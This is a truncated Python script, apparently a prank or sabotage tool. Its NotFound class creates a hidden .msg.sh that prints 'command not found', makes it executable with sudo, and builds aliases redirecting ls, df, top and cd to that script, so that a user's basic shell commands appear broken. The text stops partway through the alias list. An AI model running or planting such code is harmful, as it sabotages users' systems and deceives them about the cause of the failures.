import subprocess, os, time
 
 
 
class NotFound:
    def __init__(self):
        self.out = subprocess.getstatusoutput
        self.NewBash = []
 
    def locale(self):
        y, Home = self.out('ls /home')
        return Home
 
    def MSG(self):
        local = self.out('pwd')
 
        #os.system("echo '!#/bin/bash' > .msg.sh ")
        os.system("echo 'echo \"command not found\"' > .msg.sh ")
        os.system("sudo chmod u+x .msg.sh")
 
        return local[1]
 
 
    def Alias(self):
        local = self.MSG()
        ListAlias = ['alias ls='+local+'/.msg.sh',
            'alias df='+local+'/.msg.sh',
            'alias top='+local+'/.msg.sh',
            'alias cd='+local+'/.msg.sh',

